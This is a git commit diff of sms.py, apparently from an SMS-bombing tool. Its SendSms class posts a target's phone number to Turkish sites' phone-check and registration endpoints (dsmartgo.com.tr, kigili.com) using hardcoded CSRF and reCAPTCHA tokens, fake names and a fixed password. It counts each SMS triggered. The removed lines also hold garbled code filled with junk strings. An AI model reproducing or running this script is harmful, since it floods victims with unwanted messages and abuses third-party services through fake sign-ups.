cff6eb24ddd29718bcc69c16d1d5f1fd5a206e4e
HamzaGuclu00 <92800322+HamzaGuclu00@users.noreply.github.com>
2023-01-19 02:12:42 +0300

    new

--- sms.py
+++ sms.py
@@ -8,48 +8,46 @@ class SendSms():
     adet = 0
     
     def __init__(self, phone, mail):
-        sSADFASDFASDFelf.phone = str(phone)
+        self.phone = str(phone)
         if len(mail) != 0:
             self.mail = mail
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
 
 
-    # dCVBsmartgo.com.tr
+    # dsmartgo.com.tr
     def Dsmartgo(self):
-        dsmartgCVBequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
+        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
+        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
         	"IsSubscriber": "true",
         	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
-        	"Mobile":XCVBself.phone,
+        	"Mobile": self.phone,
         }, cookies={
         		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
-        		"_ga": "GA1XCVB.3.1016548678.1638216163",
-        		"_gat": "1",CVXBXVCB
+        		"_ga": "GA1.3.1016548678.1638216163",
+        		"_gat": "1",
         		"_gat_gtag_UA_18913632_14": "1",
         		"_gid": "GA1.3.1214889554.1638216163",
-        		"ai_session": "lsdBCVBsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
-        		"ai_user": "U+ClfGCXVV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
+        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
+        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
         	})
         try:
             BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Reddedildi ||| dsmartgo.com.tr")
-        except AttributeError:CXVB
+        except AttributeError:
             print(f"{Fore.LIGHTBLUE_EX}[+] {Style.RESET_ALL}Kabul Edildi ||| dsmartgo.com.tr")
             self.adet += 1
         
-comXVCBVCB
-    # kigili.comXVCB
+
+    # kigili.com
     def Kigili(self):    
         try:
-            kig
-            
-            
-            ili = requests.post("https://www.kigili.com/users/registration/", data={
+            kigili = requests.post("https://www.kigili.com/users/registration/", data={
                 "first_name": "Memati",
                 "last_name": "Bas",
                 "email": self.mail,
                 "phone": f"0{self.phone}",
-                "password": "3CVXBXCVB1ABC..abc31",
+                "password": "31ABC..abc31",
                 "confirm": "true",
                 "kvkk": "true",
                 "next": ""
